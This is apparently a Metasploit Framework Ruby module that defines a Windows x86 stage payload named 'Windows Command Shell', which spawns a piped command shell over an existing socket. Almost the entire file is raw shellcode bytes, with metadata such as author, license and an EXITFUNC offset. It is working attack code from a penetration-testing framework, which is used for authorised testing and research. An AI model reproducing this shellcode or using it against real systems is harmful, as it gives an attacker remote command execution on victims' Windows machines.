##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


module Metasploit3

	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Command Shell',
			'Version'       => '$Revision$',
			'Description'   => 'Spawn a piped command shell',
			'Author'        => 'spoonm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadCompat' =>
				{
					'Convention' => 'sockedi'
				},
			'Stage'         =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 443, 'V' ]
						},
					'Payload' =>
						"\x68\x33\x32\x00\x00\x68\x57\x53\x32\x5f\x57\xfc\xe8\x4c\x00\x00"+
						"\x00\x60\x8b\x6c\x24\x28\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"+
						"\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x30\x49\x8b\x34\x8b\x01\xee\x31"+
						"\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54"+
						"\x24\x24\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c"+
						"\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc2\x08\x00\x6a\x30\x59"+
						"\x64\x8b\x31\x8b\x76\x0c\x8b\x76\x1c\xad\x8b\x58\x08\x5e\x53\x68"+
						"\x8e\x4e\x0e\xec\xff\xd6\x97\x53\x56\x57\x8d\x44\x24\x10\x50\xff"+
						"\xd7\x50\x50\x50\x68\xb6\x19\x18\xe7\xff\xd6\x97\x68\xa4\x19\x70"+
						"\xe9\xff\xd6\x95\x68\x08\x92\xe2\xed\xff\xd6\x50\x57\x55\x83\xec"+
						"\x10\x89\xe5\x89\xee\x6a\x01\x6a\x00\x6a\x0c\x89\xe1\x6a\x00\x51"+
						"\x56\xad\x56\x53\x68\x80\x8f\x0c\x17\xff\x55\x20\x89\xc7\xff\xd0"+
						"\x89\xe0\x6a\x00\x50\x8d\x75\x08\x56\x8d\x75\x0c\x56\xff\xd7\x68"+
						"\x43\x4d\x44\x00\x89\xe2\x31\xc0\x8d\x7a\xac\x6a\x15\x59\xf3\xab"+
						"\x83\xec\x54\xc6\x42\xbc\x44\x66\xc7\x42\xe8\x01\x01\x8b\x75\x08"+
						"\x89\x72\xfc\x89\x72\xf8\x8b\x75\x04\x89\x72\xf4\x8d\x42\xbc\x54"+
						"\x50\x51\x51\x51\x41\x51\x49\x51\x51\x52\x51\x53\x68\x72\xfe\xb3"+
						"\x16\xff\x55\x20\xff\xd0\x31\xc0\xb4\x04\x96\x29\xf4\x89\xe7\x6a"+
						"\x64\x53\x68\xb0\x49\x2d\xdb\xff\x55\x20\xff\xd0\x31\xc0\x50\x57"+
						"\x50\x50\x50\xff\x75\x0c\x53\x68\x11\xc4\x07\xb4\xff\x55\x20\xff"+
						"\xd0\x85\xc0\x74\x74\x31\xc0\x3b\x07\x74\x36\xe8\x77\x00\x00\x00"+
						"\x50\x89\xe1\x50\x51\x56\x57\xff\x75\x0c\x53\x68\x16\x65\xfa\x10"+
						"\xff\x55\x20\xff\xd0\x85\xc0\x74\x50\x31\xc0\x59\x39\xc8\x74\x11"+
						"\x50\x51\x57\xff\x75\x28\xff\x55\x10\x31\xc9\x39\xc8\x7c\x3a\xeb"+
						"\xab\x89\xe0\xe8\x3f\x00\x00\x00\x31\xc0\x50\x56\x57\xff\x75\x28"+
						"\xff\x55\x14\x31\xc9\x39\xc8\x7c\x86\x74\x1e\x51\x89\xe2\x51\x52"+
						"\x50\x57\xff\x75\x00\x53\x68\x1f\x79\x0a\xe8\xff\x55\x20\xff\xd0"+
						"\x85\xc0\x74\x05\x31\xc0\x59\xeb\xc8\x53\x68\x7e\xd8\xe2\x73\xff"+
						"\x55\x20\x31\xc9\x51\xff\xd0\x50\x54\x68\x7e\x66\x04\x80\xff\x75"+
						"\x28\xff\x55\x18\x85\xc0\x58\x75\xe0\xc3"
				}
			))
	end

end
